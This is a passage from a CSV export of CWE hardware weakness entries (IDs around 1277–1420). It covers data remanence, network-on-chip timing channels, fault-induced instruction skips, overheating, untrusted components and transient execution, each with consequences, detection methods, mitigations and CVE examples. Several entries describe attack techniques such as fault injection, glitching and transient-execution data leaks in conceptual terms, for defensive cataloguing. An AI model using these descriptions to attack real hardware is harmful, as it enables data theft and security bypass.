ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Requirements:NOTE:Requirements development might not consider the importance of updates over the lifetime of the product or might intentionally exclude this capability due to concerns such as expense or speed to market.::PHASE:Architecture and Design:NOTE:Lack of planning during architecture development and design, or external pressures such as speed to market, could ignore the capability to update.::PHASE:Architecture and Design:NOTE:Designers might omit capabilities for updating a component due to time pressures to release the product or assumptions about the stability of the component.::PHASE:Implementation:NOTE:The weakness can appear through oversight during implementation.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Access Control:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Other:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism:IMPACT:Execute Unauthorized Code or Commands:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Quality Degradation:IMPACT:Reduce Maintainability:NOTE:If an attacker can identify an exploitable vulnerability in one product that has no means of patching, the attack may be used against all affected versions of that product.::\",\"::METHOD:Architecture or Design Review:DESCRIPTION:Check the consumer or maintainer documentation, the architecture/design documentation, or the original requirements to ensure that the documentation includes details for how to update the firmware.:EFFECTIVENESS:Moderate::\",\"::PHASE:Requirements:DESCRIPTION:Specify requirements that each component should be updateable, including ROM, firmware, etc.::PHASE:Architecture and Design:DESCRIPTION:Design the product to allow for updating of its components. Include the external infrastructure that might be necessary to support updates, such as distribution servers.::PHASE:Architecture and Design Implementation:DESCRIPTION:With hardware, support patches that can be programmed in-field or during manufacturing through hardware fuses. This feature can be used for limited patching of devices after shipping, or for the next batch of silicon devices manufactured, without changing the full device ROM.:EFFECTIVENESS:Moderate::PHASE:Implementation:DESCRIPTION:Implement the necessary functionality to allow each component to be updated.::\",\"::REFERENCE:CVE-2020-9054:DESCRIPTION:Chain: network-attached storage (NAS) device has a critical OS command injection (CWE-78) vulnerability that is actively exploited to place IoT devices into a botnet, but some products are end-of-support and cannot be patched (CWE-1277). [REF-1097]:LINK:https://www.cve.org/CVERecord?id=CVE-2020-9054::\",,,\"\",,\"\",\n1330,\"Remanent Data Readable after Memory Erase\",Variant,Draft,\"Confidential information stored in memory circuits is readable or recoverable after being cleared or erased.\",\"Data remanence occurs when stored, memory content is not fully lost after a memory-clear or -erase operation. Confidential memory contents can still be readable through data remanence in the hardware. Data remanence can occur because of performance optimization or memory organization during 'clear' or 'erase' operations, like a design that allows the memory-organization metadata (e.g., file pointers) to be erased without erasing the actual memory content. To protect against this weakness, memory devices will often support different commands for optimized memory erase and explicit secure erase. Data remanence can also happen because of the physical properties of memory circuits in use. For example, static, random-access-memory (SRAM) and dynamic, random-access-memory (DRAM) data retention is based on the charge retained in the memory cell, which depends on factors such as power supply, refresh rates, and temperature. Other than explicit erase commands, self-encrypting, secure-memory devices can also support secure erase through cryptographic erase commands. In such designs, only the decryption keys for encrypted data stored on the device are erased. That is, the stored data are always remnant in the media after a cryptographic erase. However, only the encrypted data can be extracted. Thus, protection against data recovery in such designs relies on the strength of the encryption algorithm.\",::NATURE:ChildOf:CWE ID:1301:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:1301:VIEW ID:1194:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Security Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Modify Memory:IMPACT:Read Memory:NOTE:Confidential data are readable to untrusted agent.::\",\"::METHOD:Architecture or Design Review:DESCRIPTION:Testing of memory-device contents after clearing or erase commands. Dynamic analysis of memory contents during device operation to detect specific, confidential assets. Architecture and design analysis of memory clear and erase operations.::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:Testing of memory-device contents after clearing or erase commands. Dynamic analysis of memory contents during device operation to detect specific, confidential assets. Architecture and design analysis of memory clear and erase operations.::\",\"::PHASE:Architecture and Design:DESCRIPTION:Support for secure-erase commands that apply multiple cycles of overwriting memory with known patterns and of erasing actual content. Support for cryptographic erase in self-encrypting, memory devices. External, physical tools to erase memory such as ultraviolet-rays-based erase of Electrically erasable, programmable, read-only memory (EEPROM). Physical destruction of media device. This is done for repurposed or scrapped devices that are no longer in use.::\",\"::REFERENCE:CVE-2019-8575:DESCRIPTION:Firmware Data Deletion Vulnerability in which a base station factory reset might not delete all user information. The impact of this enables a new owner of a used device that has been factory-default reset with a vulnerable firmware version can still retrieve, at least, the previous owner's wireless network name, and the previous owner's wireless security (such as WPA2) key. This issue was addressed with improved, data deletion.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-8575::\",,,\"\",::150::37::545::,\"\",\n1331,\"Improper Isolation of Shared Resources in Network On Chip (NoC)\",Base,Stable,\"The Network On Chip (NoC) does not isolate or incorrectly isolates its on-chip-fabric and internal resources such that they are shared between trusted and untrusted agents, creating timing channels.\",\"Typically, network on chips (NoC) have many internal resources that are shared between packets from different trust domains. These resources include internal buffers, crossbars and switches, individual ports, and channels. The sharing of resources causes contention and introduces interference between differently trusted domains, which poses a security threat via a timing channel, allowing attackers to infer data that belongs to a trusted agent. This may also result in introducing network interference, resulting in degraded throughput and latency.\",::NATURE:ChildOf:CWE ID:653:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:668:VIEW ID:1000::NATURE:PeerOf:CWE ID:1189:VIEW ID:1194::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Security Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"::Network-on-chip (NoC) is a commonly-used term used for hardware interconnect fabrics used by multicore Systems-on-Chip (SoC). Communication between modules on the chip uses packet-based methods, with improved efficiency and scalability compared to bus architectures [REF-1241].::\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Availability:IMPACT:DoS: Resource Consumption (Other):IMPACT:Varies by Context:IMPACT:Other:LIKELIHOOD:Medium:NOTE:Attackers may infer data that belongs to a trusted agent. The methods used to perform this attack may result in noticeably increased resource consumption.::\",\"::METHOD:Manual Analysis:DESCRIPTION:Providing marker flags to send through the interfaces coupled with examination of which users are able to read or manipulate the flags will help verify that the proper isolation has been achieved and is effective.:EFFECTIVENESS:Moderate::\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:Implement priority-based arbitration inside the NoC and have dedicated buffers or virtual channels for routing secret data from trusted agents.::\",\"::REFERENCE:CVE-2021-33096:DESCRIPTION:Improper isolation of shared resource in a network-on-chip leads to denial of service:LINK:https://www.cve.org/CVERecord?id=CVE-2021-33096::\",,,\"\",::124::,\"\",\n1332,\"Improper Handling of Faults that Lead to Instruction Skips\",Base,Stable,\"The device is missing or incorrectly implements circuitry or sensors that detect and mitigate the skipping of security-critical CPU instructions when they occur.\",\"The operating conditions of hardware may change in ways that cause unexpected behavior to occur, including the skipping of security-critical CPU instructions. Generally, this can occur due to electrical disturbances or when the device operates outside of its expected conditions. In practice, application code may contain conditional branches that are security-sensitive (e.g., accepting or rejecting a user-provided password). These conditional branches are typically implemented by a single conditional branch instruction in the program binary which, if skipped, may lead to effectively flipping the branch condition - i.e., causing the wrong security-sensitive branch to be taken. This affects processes such as firmware authentication, password verification, and other security-sensitive decision points. Attackers can use fault injection techniques to alter the operating conditions of hardware so that security-critical instructions are skipped more frequently or more reliably than they would in a natural setting.\",::NATURE:ChildOf:CWE ID:1384:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:1247:VIEW ID:1194:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:Failure to design appropriate countermeasures to common fault injection techniques can manifest this weakness.::PHASE:Implementation:NOTE:This weakness can arise if the hardware design incorrectly implements countermeasures to prevent fault injection.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Authentication:IMPACT:Bypass Protection Mechanism:IMPACT:Alter Execution Logic:IMPACT:Unexpected State:LIKELIHOOD:High:NOTE:Depending on the context, instruction skipping can have a broad range of consequences related to the generic bypassing of security critical code.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:This weakness can be found using automated static analysis once a developer has indicated which code paths are critical to protect.:EFFECTIVENESS:Moderate::METHOD:Simulation / Emulation:DESCRIPTION:This weakness can be found using automated dynamic analysis. Both emulation of a CPU with instruction skips, as well as RTL simulation of a CPU IP, can indicate parts of the code that are sensitive to faults due to instruction skips.:EFFECTIVENESS:Moderate::METHOD:Manual Analysis:DESCRIPTION:This weakness can be found using manual (static) analysis. The analyst has security objectives that are matched against the high-level code. This method is less precise than emulation, especially if the analysis is done at the higher level language rather than at assembly level.:EFFECTIVENESS:Moderate::\",\"::PHASE:Architecture and Design:DESCRIPTION:Design strategies for ensuring safe failure if inputs, such as Vcc, are modified out of acceptable ranges.::PHASE:Architecture and Design:DESCRIPTION:Design strategies for ensuring safe behavior if instructions attempt to be skipped.::PHASE:Architecture and Design:DESCRIPTION:Identify mission critical secrets that should be wiped if faulting is detected, and design a mechanism to do the deletion.::PHASE:Implementation:DESCRIPTION:Add redundancy by performing an operation multiple times, either in space or time, and perform majority voting. Additionally, make conditional instruction timing unpredictable.::PHASE:Implementation:DESCRIPTION:Use redundant operations or canaries to detect and respond to faults.::PHASE:Implementation:DESCRIPTION:Ensure that fault mitigations are strong enough in practice. For example, a low power detection mechanism that takes 50 clock cycles to trigger at lower voltages may be an insufficient security mechanism if the instruction counter has already progressed with no other CPU activity occurring.::\",\"::REFERENCE:CVE-2019-15894:DESCRIPTION:fault injection attack bypasses the verification mode, potentially allowing arbitrary code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-15894::\",::Power::,,\"\",::624::625::,\"\",\n1334,\"Unauthorized Error Injection Can Degrade Hardware Redundancy\",Base,Draft,\"An unauthorized agent can inject errors into a redundant block to deprive the system of redundancy or put the system in a degraded operating mode.\",\"To ensure the performance and functional reliability of certain components, hardware designers can implement hardware blocks for redundancy in the case that others fail. This redundant block can be prevented from performing as intended if the design allows unauthorized agents to inject errors into it. In this way, a path with injected errors may become unavailable to serve as a redundant channel. This may put the system into a degraded mode of operation which could be exploited by a subsequent attack.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:Such issues could be introduced during hardware architecture and design and identified later during Testing or System Configuration phases.::PHASE:Implementation:NOTE:Such issues could be introduced during implementation and identified later during Testing or System Configuration phases.::PHASE:Integration:NOTE:Such issues could be introduced during integration and identified later during Testing or System Configuration phases.::\",\"\",,\"::SCOPE:Integrity:SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:DoS: Instability:IMPACT:Quality Degradation:IMPACT:DoS: Resource Consumption (CPU):IMPACT:DoS: Resource Consumption (Memory):IMPACT:DoS: Resource Consumption (Other):IMPACT:Reduce Performance:IMPACT:Reduce Reliability:IMPACT:Unexpected State::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Ensure the design does not allow error injection in modes intended for normal run-time operation. Provide access controls on interfaces for injecting errors.::PHASE:Implementation:DESCRIPTION:Disallow error injection in modes which are expected to be used for normal run-time operation. Provide access controls on interfaces for injecting errors.::PHASE:Integration:DESCRIPTION:Add an access control layer atop any unprotected interfaces for injecting errors.::\",\"\",,,\"\",::624::625::,\"\",\n1338,\"Improper Protections Against Hardware Overheating\",Base,Draft,\"A hardware device is missing or has inadequate protection features to prevent overheating.\",\"Hardware, electrical circuits, and semiconductor silicon have thermal side effects, such that some of the energy consumed by the device gets dissipated as heat and increases the temperature of the device. For example, in semiconductors, higher-operating frequency of silicon results in higher power dissipation and heat. The leakage current in CMOS circuits increases with temperature, and this creates positive feedback that can result in thermal runaway and damage the device permanently. Any device lacking protections such as thermal sensors, adequate platform cooling, or thermal insulation is susceptible to attacks by malicious software that might deliberately operate the device in modes that result in overheating. This can be used as an effective denial of service (DoS) or permanent denial of service (PDoS) attack. Depending on the type of hardware device and its expected usage, such thermal overheating can also cause safety hazards and reliability issues. Note that battery failures can also cause device overheating but the mitigations and examples included in this submission cannot reliably protect against a battery failure. There can be similar weaknesses with lack of protection from attacks based on overvoltage or overcurrent conditions. However, thermal heat is generated by hardware operation and the device should implement protection from overheating.\",::NATURE:ChildOf:CWE ID:693:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Power Management Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Processor Hardware:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:Such issues could be introduced during hardware architecture, design or implementation.::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Resource Consumption (Other):LIKELIHOOD:High::\",\"::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:Dynamic tests should be performed to stress-test temperature controls.:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:Power management controls should be part of Architecture and Design reviews.:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Temperature maximum and minimum limits should be enforced using thermal sensors both in silicon and at the platform level.::PHASE:Implementation:DESCRIPTION:The platform should support cooling solutions such as fans that can be modulated based on device-operation needs to maintain a stable temperature.::\",\"\",,,\"\",::624::625::,\"\",\n1342,\"Information Exposure through Microarchitectural State after Transient Execution\",Base,Incomplete,\"The processor does not properly clear microarchitectural state after incorrect microcode assists or speculative execution, resulting in transient execution.\",\"In many processor architectures an exception, mis-speculation, or microcode assist results in a flush operation to clear results that are no longer required. This action prevents these results from influencing architectural state that is intended to be visible from software. However, traces of this transient execution may remain in microarchitectural buffers, resulting in a change in microarchitectural state that can expose sensitive information to an attacker using side-channel analysis. For example, Load Value Injection (LVI) [REF-1202] can exploit direct injection of erroneous values into intermediate load and store buffers. Several conditions may need to be fulfilled for a successful attack: incorrect transient execution that results in remanence of sensitive information; attacker has the ability to provoke microarchitectural exceptions; operations and structures in victim code that can be exploited must be identified.\",::NATURE:ChildOf:CWE ID:226:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:226:VIEW ID:1194:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Workstation:ARCHITECTURE PREVALENCE:Undetermined::ARCHITECTURE NAME:x86:ARCHITECTURE PREVALENCE:Undetermined::ARCHITECTURE NAME:ARM:ARCHITECTURE PREVALENCE:Undetermined::ARCHITECTURE NAME:Other:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Requirements::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:Execute Unauthorized Code or Commands:LIKELIHOOD:Medium::\",\"\",\"::PHASE:Architecture and Design Requirements:DESCRIPTION:Hardware ensures that no illegal data flows from faulting micro-ops exists at the microarchitectural level.:EFFECTIVENESS:High::PHASE:Build and Compilation:DESCRIPTION:Include instructions that explicitly remove traces of unneeded computations from software interactions with microarchitectural elements e.g. lfence, sfence, mfence, clflush.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2020-0551:DESCRIPTION:Load value injection in some processors utilizing speculative execution may allow an authenticated user to enable information disclosure via a side-channel with local access.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-0551::\",,,\"\",::696::,\"::TYPE:Relationship:NOTE:CWE-1342 differs from CWE-1303, which is related to misprediction and biasing microarchitectural components, while CWE-1342 addresses illegal data flows and retention. For example, Spectre is an instance of CWE-1303 biasing branch prediction to steer the transient execution indirectly.::TYPE:Maintenance:NOTE:As of CWE 4.9, members of the CWE Hardware SIG are closely analyzing this entry and others to improve CWE's coverage of transient execution weaknesses, which include issues related to Spectre, Meltdown, and other attacks. Additional investigation may include other weaknesses related to microarchitectural state. As a result, this entry might change significantly in CWE 4.10.::\",\n1351,\"Improper Handling of Hardware Behavior in Exceptionally Cold Environments\",Base,Incomplete,\"A hardware device, or the firmware running on it, is missing or has incorrect protection features to maintain goals of security primitives when the device is cooled below standard operating temperatures.\",\"The hardware designer may improperly anticipate hardware behavior when exposed to exceptionally cold conditions. As a result they may introduce a weakness by not accounting for the modified behavior of critical components when in extreme environments. An example of a change in behavior is that power loss won't clear/reset any volatile state when cooled below standard operating temperatures. This may result in a weakness when the starting state of the volatile memory is being relied upon for a security decision. For example, a Physical Unclonable Function (PUF) may be supplied as a security primitive to improve confidentiality, authenticity, and integrity guarantees. However, when the PUF is paired with DRAM, SRAM, or another temperature sensitive entropy source, the system designer may introduce weakness by failing to account for the chosen entropy source's behavior at exceptionally low temperatures. In the case of DRAM and SRAM, when power is cycled at low temperatures, the device will not contain the bitwise biasing caused by inconsistencies in manufacturing and will instead contain the data from previous boot. Should the PUF primitive be used in a cryptographic construction which does not account for full adversary control of PUF seed data, weakness would arise. This weakness does not cover Cold Boot Attacks wherein RAM or other external storage is super cooled and read externally by an attacker.\",::NATURE:ChildOf:CWE ID:1384:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Embedded:ARCHITECTURE PREVALENCE:Undetermined::ARCHITECTURE CLASS:Microcomputer:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Authentication:IMPACT:Varies by Context:IMPACT:Unexpected State:LIKELIHOOD:Low:NOTE:Consequences of this weakness are highly contextual.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:The system should account for security primitive behavior when cooled outside standard temperatures.::\",\"\",,,\"\",::624::625::,\"\",\n1357,\"Reliance on Insufficiently Trustworthy Component\",Class,Incomplete,\"The product is built from multiple separate components, but it uses a component that is not sufficiently trusted to meet expectations for security, reliability, updateability, and maintainability.\",\"Many modern hardware and software products are built by combining multiple smaller components together into one larger entity, often during the design or architecture phase. For example, a hardware component might be built by a separate supplier, or the product might use an open-source software library from a third party. Regardless of the source, each component should be sufficiently trusted to ensure correct, secure operation of the product. If a component is not trustworthy, it can produce significant risks for the overall product, such as vulnerabilities that cannot be patched fast enough (if at all); hidden functionality such as malware; inability to update or replace the component if needed for security purposes; hardware components built from parts that do not meet specifications in ways that can lead to weaknesses; etc. Note that a component might not be trustworthy even if it is owned by the product vendor, such as a software component whose source code is lost and was built by developers who left the company, or a component that was developed by a separate company that was acquired and brought into the product's own company. Note that there can be disagreement as to whether a component is sufficiently trustworthy, since trust is ultimately subjective. Different stakeholders (e.g., customers, vendors, governments) have various threat models and ways to assess trust, and design/architecture choices might make tradeoffs between security, reliability, safety, privacy, cost, and other characteristics.\",::NATURE:ChildOf:CWE ID:710:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Requirements:NOTE:Requirements might include criteria for which the only available solutions are provided by insufficiently trusted components.::PHASE:Architecture and Design:NOTE:An insufficiently trusted component might be selected because it is less expensive to do in-house, requires expertise that is not available in-house, or might allow the product to reach the market faster.::\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"::PHASE:Requirements Architecture and Design Implementation:DESCRIPTION:For each component, ensure that its supply chain is well-controlled with sub-tier suppliers using best practices. For third-party software components such as libraries, ensure that they are developed and actively maintained by reputable vendors.::PHASE:Architecture and Design Implementation Integration Manufacturing:DESCRIPTION:Maintain a Bill of Materials for all components and sub-components of the product. For software, maintain a Software Bill of Materials (SBOM). According to [REF-1247], An SBOM is a formal, machine-readable inventory of software components and dependencies, information about those components, and their hierarchical relationships.::PHASE:Operation Patching and Maintenance:DESCRIPTION:Continue to monitor changes in each of the product's components, especially when the changes indicate new vulnerabilities, end-of-life (EOL) plans, supplier practices that affect trustworthiness, etc.::\",\"::REFERENCE:CVE-2020-9054:DESCRIPTION:Chain: network-attached storage (NAS) device has a critical OS command injection (CWE-78) vulnerability that is actively exploited to place IoT devices into a botnet, but some products are end-of-support and cannot be patched (CWE-1277). [REF-1097]:LINK:https://www.cve.org/CVERecord?id=CVE-2020-9054::\",,,\"::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 2-4:ENTRY NAME:Req SP.03.02 RE(1)::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 2-4:ENTRY NAME:Req SP.03.02 RE(2)::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 1.13::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req EDR 3.12::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req HDR 3.12::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req NDR 3.12::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req EDR 3.13::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req HDR 3.13::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req NDR 3.13::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR-7.8::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SM-6::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SM-9::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SM-10::\",,\"::TYPE:Maintenance:NOTE:As of CWE 4.10, the name and description for this entry has undergone significant change and is still under public discussion, especially by members of the HW SIG.::\",\n1384,\"Improper Handling of Physical or Environmental Conditions\",Class,Incomplete,\"The product does not properly handle unexpected physical or environmental conditions that occur naturally or are artificially induced.\",\"Hardware products are typically only guaranteed to behave correctly within certain physical limits or environmental conditions. Such products cannot necessarily control the physical or external conditions to which they are subjected. However, the inability to handle such conditions can undermine a product's security. For example, an unexpected physical or environmental condition may cause the flipping of a bit that is used for an authentication decision. This unexpected condition could occur naturally or be induced artificially by an adversary. Physical or environmental conditions of concern are: Atmospheric characteristics: extreme temperature ranges, etc. Interference: electromagnetic interference (EMI), radio frequency interference (RFI), etc. Assorted light sources: white light, ultra-violet light (UV), lasers, infrared (IR), etc. Power variances: under-voltages, over-voltages, under-current, over-current, etc. Clock variances: glitching, overclocking, clock stretching, etc. Component aging and degradation Materials manipulation: focused ion beams (FIB), etc. Exposure to radiation: x-rays, cosmic radiation, etc.\",::NATURE:ChildOf:CWE ID:703:VIEW ID:1000:ORDINAL:Primary::,\"\",::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:The product's design might not consider checking and handling extreme conditions.::PHASE:Manufacturing:NOTE:For hardware manufacturing, sub-par components might be chosen that are not able to handle the expected environmental conditions.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Varies by Context:IMPACT:Unexpected State:NOTE:Consequences of this weakness are highly dependent on the role of affected components within the larger product.::\",\"\",\"::PHASE:Requirements:DESCRIPTION:In requirements, be specific about expectations for how the product will perform when it exceeds physical and environmental boundary conditions, e.g., by shutting down.::PHASE:Architecture and Design Implementation:DESCRIPTION:Where possible, include independent components that can detect excess environmental conditions and have the capability to shut down the product.::PHASE:Architecture and Design Implementation:DESCRIPTION:Where possible, use shielding or other materials that can increase the adversary's workload and reduce the likelihood of being able to successfully trigger a security-related failure.::\",\"::REFERENCE:CVE-2019-17391:DESCRIPTION:Lack of anti-glitch protections allows an attacker to launch a physical attack to bypass the secure boot and read protected eFuses.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-17391::\",,,\"\",,\"\",\n1420,\"Exposure of Sensitive Information during Transient Execution\",Base,Incomplete,\"A processor event or prediction may allow incorrect operations (or correct operations with incorrect data) to execute transiently, potentially exposing data over a covert channel.\",\"When operations execute but do not commit to the processor's architectural state, this is commonly referred to as transient execution. This behavior can occur when the processor mis-predicts an outcome (such as a branch target), or when a processor event (such as an exception or microcode assist, etc.) is handled after younger operations have already executed. Operations that execute transiently may exhibit observable discrepancies (CWE-203) in covert channels [REF-1400] such as data caches. Observable discrepancies of this kind can be detected and analyzed using timing or power analysis techniques, which may allow an attacker to infer information about the operations that executed transiently. For example, the attacker may be able to infer confidential data that was accessed or used by those operations. Transient execution weaknesses may be exploited using one of two methods. In the first method, the attacker generates a code sequence that exposes data through a covert channel when it is executed transiently (the attacker must also be able to trigger transient execution). Some transient execution weaknesses can only expose data that is accessible within the attacker's processor context. For example, an attacker executing code in a software sandbox may be able to use a transient execution weakness to expose data within the same address space, but outside of the attacker's sandbox. Other transient execution weaknesses can expose data that is architecturally inaccessible, that is, data protected by hardware-enforced boundaries such as page tables or privilege rings. These weaknesses are the subject of CWE-1421. In the second exploitation method, the attacker first identifies a code sequence in a victim program that, when executed transiently, can expose data that is architecturally accessible within the victim's processor context. For instance, the attacker may search the victim program for code sequences that resemble a bounds-check bypass sequence (see Demonstrative Example 1). If the attacker can trigger a mis-prediction of the conditional branch and influence the index of the out-of-bounds array access, then the attacker may be able to infer the value of out-of-bounds data by monitoring observable discrepancies in a covert channel.\",::NATURE:ChildOf:CWE ID:669:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:This weakness can be introduced when a computing unit (such as a CPU, GPU, accelerator, or any other processor) uses out-of-order execution, speculation, or any other microarchitectural feature that can allow microarchitectural operations to execute without committing to architectural state.::PHASE:Implementation:NOTE:This weakness can be introduced when sandboxes or managed runtimes are not properly isolated by using hardware-enforced boundaries. Developers of sandbox or managed runtime software should exercise caution when relying on software techniques (such as bounds checking) to prevent code in one sandbox from accessing confidential data in another sandbox. For example, an attacker sandbox may be able to trigger a processor event or mis-prediction in a manner that allows it to transiently read a victim sandbox's private 